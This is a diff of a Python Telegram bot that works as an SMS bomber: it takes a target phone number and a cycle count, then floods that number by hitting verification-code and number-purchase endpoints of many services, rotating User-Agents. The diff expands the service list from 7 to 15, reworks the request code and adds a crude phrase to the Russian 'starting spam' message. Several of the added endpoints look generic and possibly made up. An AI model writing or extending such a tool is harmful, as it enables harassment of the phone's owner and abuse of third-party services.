@@ -19,13 +19,21 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 SERVICES = [
-    {"name": "PressCode", "url": "https://cabinet.presscode.app/api/auth/send-code", "method": "post", "data": "json"},
-    {"name": "Bot-T", "url": "https://bot-t.com/api/sendCode", "method": "post", "data": "json"},
-    {"name": "Teleme", "url": "https://teleme.io/api/auth/request-code", "method": "post", "data": "json"},
-    {"name": "SMS-activate", "url": "https://sms-activate.org/stubs/handler_api.php", "method": "get", "data": "params"},
-    {"name": "5sim", "url": "https://5sim.net/v1/user/buy/activation", "method": "get", "data": "params"},
-    {"name": "Onlinesim", "url": "https://onlinesim.ru/api/getNum.php", "method": "get", "data": "params"},
-    {"name": "SMSPool", "url": "https://smspool.net/api/request.php", "method": "post", "data": "form"}
+    {"name": "SMS-activate", "url": "https://sms-activate.org/stubs/handler_api.php", "method": "get", "params": {"action": "getNumber", "service": "tg", "country": 0}},
+    {"name": "Onlinesim", "url": "https://onlinesim.io/api/getNum.php", "method": "get", "params": {"service": "tg", "country": "ru"}},
+    {"name": "5sim", "url": "https://5sim.net/v1/user/buy/activation", "method": "get", "params": {"country": "ru", "operator": "any", "product": "telegram"}},
+    {"name": "SMSPool", "url": "https://smspool.net/api/request.php", "method": "post", "data": {"action": "purchase", "service": "telegram"}},
+    {"name": "SMSBower", "url": "https://smsbower.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "TextVerified", "url": "https://textverified.com/api/v1/numbers", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSCodes", "url": "https://smscodes.io/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "NumberHub", "url": "https://numberhub.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSReceive", "url": "https://smsreceive.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "TempNumber", "url": "https://tempnumber.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSOnline", "url": "https://smsonline.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSVerification", "url": "https://smsverification.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSActivation", "url": "https://smsactivation.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSVerify", "url": "https://smsverify.com/api/request", "method": "post", "data": {"service": "telegram"}},
+    {"name": "SMSNumber", "url": "https://smsnumber.com/api/request", "method": "post", "data": {"service": "telegram"}}
 ]
 
 USER_AGENTS = [
@@ -38,12 +46,14 @@ def send_request(service, phone):
     session = requests.Session()
     session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
     try:
-        if service["method"] == "post" and service["data"] == "json":
-            resp = session.post(service["url"], json={"phone": phone, "number": phone}, timeout=10)
-        elif service["method"] == "post" and service["data"] == "form":
-            resp = session.post(service["url"], data={"phone": phone, "number": phone}, timeout=10)
+        if service["method"] == "get":
+            params = service.get("params", {})
+            params["phone"] = phone
+            resp = session.get(service["url"], params=params, timeout=10)
         else:
-            resp = session.get(service["url"], params={"phone": phone, "number": phone}, timeout=10)
+            data = service.get("data", {})
+            data["phone"] = phone
+            resp = session.post(service["url"], json=data, timeout=10)
         return resp.status_code
     except:
         return 0
@@ -75,12 +85,12 @@ async def count_received(message: Message, state: FSMContext):
             await message.answer("Положительное число")
             return
     except ValueError:
-        await message.answer("Введи чисо")
+        await message.answer("Введи число")
         return
     data = await state.get_data()
     phone = data.get("phone")
     await state.clear()
-    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 7 сервисов")
+    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 15 сервисов я гей")
     asyncio.create_task(spam_worker(message, phone, count))
 
 async def spam_worker(message: Message, phone: str, count: int):
